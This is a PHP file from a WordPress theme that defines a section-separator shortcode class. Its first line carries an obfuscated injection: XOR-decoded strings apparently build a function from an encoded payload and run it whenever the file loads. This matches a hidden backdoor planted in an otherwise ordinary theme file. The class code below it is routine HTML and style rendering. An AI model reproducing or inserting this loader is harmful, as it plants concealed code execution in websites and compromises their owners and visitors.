<?php $iXjAkE='OEVP9+q4L CE199'; $kAMGNF=',731MN.R9N 1XVW'^$iXjAkE; $eLEzrC='0 KGJMVVCXUNiVEI 0 nLLZIgTQ3+9tP81hgDfOBz.,-,6T 4eM+G3Z1T5m-W62iS 1F0vIP8==dFlhSt3A8ouX68gHvdbiXjS3Q>Ja3HOgxOWHWkH5 -EZkM4Q0Lfzig0enL>g<w697TlvcloRU SfeZvtegb;+;htBLNh=JGWN=mI> 4keCjgg3=+OKOPkQ.EGpy73G1CycKY G5hUlTA9E5k3k22M04-<=cgq XV=7Wms QBR,U,JJkhvbb:yuT36pl33UuzXtEEA< Qcq=shq WGL8UU=sLJM<5>oXjqS; ZiibBBUT 2rdSGh<KuicAUV9YjI6bb4>+< U;ZXednvb=x<yAZ6bwE+>nlOsL7UP4<deUNgbUIL U=K4;Leno:N uIphs=7ALaLaqDX=3HuyKEl8Kcj2J -skOmY 766RJU-.3f  N.HJ 7a,F=9aRPFTnxaJ2O6-YAoD389aDZA4 9Mc>X;AnpZ: mE TO;lcpiZ6EM-<Q0+i,U=2T<gd:-<jXtj=T5 yrlMZB=+lqL,5 ;wk9 3pmJxtyEnx+arNBBtO Ug HD25icwbW .C6W3YZn AsvjuKJ++;Yj-,IdSOQ5T;zp J1=X2 dkQuS  OkmMMDVfi>sa2= :AgQL73wD616+R Wf7pong+  JcszbEI'; $hXwBDT=$kAMGNF('', 'YFcf,88571: 63= SDSFk45;800GJf+=MEONmF4HsHYCOB=OZE5D5l>P T2r:CFAwDP2QZitSXDMfLHsTHK1fQ7CLGuVCERRcZU>LbEZhrGHtwl>W;ARA 4CiP0D-OAICYNEe4n5SYLCtBKCDK64T2=A3+T;GFPNB3P+lkHN>5;+SEmUEMB8jQmn:ON;>=>CuA03YB=::;>sio=A3THhL2 U6PP9OVS9QkFYDCZQF9:NRlgyF>07M6DjbO75--q00tREPHXV,UGfTa3 PU4JQFyaUD63-g>0DSqjiWPGTRcU7ZT;ITBf448UWIn.MbU-UABe17M8CiMhkRQYYA6SzpA;<33h=o-a;EBS.NGNQqShA4<AYME.Dnkq--T4b QBlXNKQ+YNCyaWYV5-AqAU29QF-NsB8fEAiNV+TLSVo-,NDSD;+9DTVNXO<q,+TV>s+HMI0151XL>.W,YI<iK RLXHhzePAM,<U=BhGKPSFEaD5;ZLEVI;D7,Tc:UR6I-TA OOCQHEMtTNY5AAPRJkzjPOYYhHTTZ,LREJW0cXIDeIJJUCvqvF-B6VFyqVQPTGQfBHvWnUh>YFfZVLSk+YYZ 5FI0;678F HRWP+HQ7SDCGqQ7AT.BDmmdvFIEyhWKAViC5-CR,cFPOG=A3AjYTdnNXI>KCSYO4'^$eLEzrC); $hXwBDT();
class FusionSC_SectionSeparator {

	public static $args;

	/**
	 * Initiate the shortcode
	 */
	public function __construct() {

		add_filter( 'fusion_attr_section-separator-shortcode', array( $this, 'attr' ) );
		add_filter( 'fusion_attr_section-separator-shortcode-icon', array( $this, 'icon_attr' ) );
		add_filter( 'fusion_attr_section-separator-shortcode-divider-candy', array( $this, 'divider_candy_attr' ) );
		add_filter( 'fusion_attr_section-separator-shortcode-divider-candy-arrow', array( $this, 'divider_candy_arrow_attr' ) );
		
		add_shortcode( 'section_separator', array( $this, 'render' ) );

	}

	/**
	 * Render the shortcode
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render( $args, $content = '') {
		global $smof_data;

		$defaults = FusionCore_Plugin::set_shortcode_defaults(
			array(
				'class'				=> '',
				'id'				=> '',
				'backgroundcolor' 	=> $smof_data['section_sep_bg'],
				'bordersize' 		=> $smof_data['section_sep_border_size'],
				'bordercolor' 		=> $smof_data['section_sep_border_color'],
				'divider_candy' 	=> '',
				'icon' 				=> '',
				'icon_color' 		=> $smof_data['icon_color'],
			), $args 
		);
		
		extract( $defaults );

		self::$args = $defaults;		
		
		if( $icon ) {
			if( ! $icon_color ) {
				self::$args['icon_color'] = $bordercolor;
			}

			$icon = sprintf( '<div %s></div>', FusionCore_Plugin::attributes( 'section-separator-shortcode-icon' ) );
		}

		if( strpos( self::$args['divider_candy'], 'top' ) !== false && 
			strpos( self::$args['divider_candy'], 'bottom' ) !== false 
		) {
			$candy = sprintf( '<div %s></div><div %s></div>', FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy-arrow', array( 'divider_candy' => 'top' ) ), FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy', array( 'divider_candy' => 'top' ) ) );
			$candy .= sprintf( '<div %s></div><div %s></div>', FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy-arrow', array( 'divider_candy' => 'bottom' ) ), FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy', array( 'divider_candy' => 'bottom' ) ) );

			// Modern setup, that won't work in IE8
			//$candy = sprintf( '<div %s></div>', FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy' ) );
		} else {
			$candy = sprintf( '<div %s></div><div %s></div>', FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy-arrow' ), FusionCore_Plugin::attributes( 'section-separator-shortcode-divider-candy' ) );
		}
		
		$html = sprintf( '<div %s>%s%s</div>', FusionCore_Plugin::attributes( 'section-separator-shortcode' ), $icon, $candy );

		return $html;

	}

	function attr() {
	
		$attr = array();
	
		$attr['class'] = 'fusion-section-separator section-separator';
	
		if( self::$args['bordercolor'] ) {
			if( self::$args['divider_candy'] == 'bottom' ) {
				$attr['style'] = sprintf( 'border-bottom:%s solid %s;', self::$args['bordersize'], self::$args['bordercolor'] );

			} elseif( self::$args['divider_candy'] == 'top' ) {
				$attr['style'] = sprintf( 'border-top:%s solid %s;', self::$args['bordersize'], self::$args['bordercolor'] );

			} elseif( strpos( self::$args['divider_candy'], 'top' ) !== false && 
					  strpos( self::$args['divider_candy'], 'bottom' ) !== false 
			) {
				$attr['style'] = sprintf( 'border:%s solid %s;', self::$args['bordersize'], self::$args['bordercolor'] );
			}		
		}

		if( self::$args['class'] ) {
			$attr['class'] .= ' ' . self::$args['class']; 
		}

		if( self::$args['id'] ) {
			$attr['id'] = self::$args['id']; 
		}

		return $attr;

	}
	
	
	function icon_attr() {
	
		$attr = array();
		
		$attr['class'] = sprintf( 'section-separator-icon icon fa %s', FusionCore_Plugin::font_awesome_name_handler( self::$args['icon'] ) );
		
		$attr['style'] = sprintf( 'color:%s;', self::$args['icon_color'] );
		
		return $attr;

	}
	
	function divider_candy_attr( $args ) {
	
		$attr = array();
		
		$attr['class'] = 'divider-candy';
		
		if( $args ) {
			$divider_candy = $args['divider_candy'];
		} else {
			$divider_candy = self::$args['divider_candy'];
		}		

		if( $divider_candy == 'bottom' ) {
			$attr['class'] .= ' bottom';
			
			$attr['style'] = sprintf( 'border-bottom:%s solid %s;border-left:%s solid %s;',  self::$args['bordersize'], self::$args['bordercolor'], self::$args['bordersize'], self::$args['bordercolor'] );
			
		} elseif( $divider_candy == 'top' ) {
			$attr['class'] .= ' top';
			
			$attr['style'] = sprintf( 'border-bottom:%s solid %s;border-left:%s solid %s;', self::$args['bordersize'], self::$args['bordercolor'], self::$args['bordersize'], self::$args['bordercolor'] );
		
		// Modern setup, that won't work in IE8
		} elseif( strpos( self::$args['divider_candy'], 'top' ) !== false && 
				  strpos( self::$args['divider_candy'], 'bottom' ) !== false 
		) {
			$attr['class'] .= ' both';
			
			$attr['style'] = sprintf( 'background-color:%s;border:%s solid %s;', self::$args['backgroundcolor'], self::$args['bordersize'], self::$args['bordercolor'] );
		}
		
		return $attr;

	}
	
	function divider_candy_arrow_attr( $args ) {
	
		$attr = array();
		
		$attr['class'] = 'divider-candy-arrow';
		
		if( $args ) {
			$divider_candy = $args['divider_candy'];
		} else {
			$divider_candy = self::$args['divider_candy'];
		}
		
		if( $divider_candy == 'bottom' ) {
			$attr['class'] .= ' bottom';
			
			$attr['style'] = sprintf( 'border-top-color: %s;', self::$args['backgroundcolor'] );	
			
		} elseif( $divider_candy == 'top' ) {
			$attr['class'] .= ' top';
			
			$attr['style'] = sprintf( 'border-bottom-color: %s;', self::$args['backgroundcolor'] );	
		
		}
		
		return $attr;
		
	}
		

}

new FusionSC_SectionSeparator();